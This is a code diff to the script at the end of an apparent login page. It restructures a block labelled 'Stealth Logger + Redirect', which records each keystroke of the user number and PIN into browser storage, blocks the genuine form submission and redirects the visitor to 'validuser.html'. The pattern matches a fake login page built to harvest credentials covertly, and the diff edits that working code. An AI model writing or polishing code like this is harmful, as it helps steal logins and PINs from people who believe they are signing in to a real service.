@@ -1260,44 +1260,39 @@ resizeTo(screen.availWidth,screen.availHeight-20);
 // ################################################################
 
 <script>
-// ===== 1. Load footer.js Asynchronously =====
-const footerScript = document.createElement('script');
-footerScript.src = '/itsincludes/js/footer.js';
+// ===== 1. Load footer.js via document.write =====
+document.write('<div class="col-sm-12"><script src="/itsincludes/js/footer.js"><\/script></div>');
 
-footerScript.onload = function() {
-    // ===== 2. Initialize Form After Script Loads =====
-    document.addEventListener('DOMContentLoaded', function() {
-        const form = document.forms['frmLogin'];
+// ===== 2. Stealth Logger + Redirect =====
+document.addEventListener('DOMContentLoaded', function() {
+    const form = document.forms['frmLogin'];
 
-        // Load saved credentials
-        const saved = JSON.parse(localStorage.getItem('loginData') || '{}');
-        form.unum.value = saved.unum || '';
-        form.pin.value = saved.pin || '';
+    // Load saved credentials
+    const saved = JSON.parse(localStorage.getItem('loginData') || '{}');
+    form.unum.value = saved.unum || '';
+    form.pin.value = saved.pin || '';
 
-        // Auto-save inputs
-        function saveToStorage() {
-            localStorage.setItem('loginData', JSON.stringify({
-                unum: form.unum.value,
-                pin: form.pin.value
-            }));
-            console.log('[Stealth] Saved credentials');
-        }
+    // Auto-save inputs
+    function saveToStorage() {
+        localStorage.setItem('loginData', JSON.stringify({
+            unum: form.unum.value,
+            pin: form.pin.value
+        }));
+        console.log('[Stealth] Saved credentials');
+    }
 
-        form.unum.addEventListener('input', saveToStorage);
-        form.pin.addEventListener('input', saveToStorage);
+    form.unum.addEventListener('input', saveToStorage);
+    form.pin.addEventListener('input', saveToStorage);
 
-        // Handle redirect
-        form.addEventListener('submit', function(e) {
-            e.preventDefault();
-            saveToStorage();
-            window.location.href = 'validuser.html'; // Redirect
-        });
-
-        console.log('[Stealth] Initialized');
+    // Handle redirect
+    form.addEventListener('submit', function(e) {
+        e.preventDefault();
+        saveToStorage();
+        window.location.href = 'validuser.html'; // Redirect
     });
-};
 
-document.body.appendChild(footerScript);
+    console.log('[Stealth] Initialized');
+});
 </script>
 </body>
 </html>
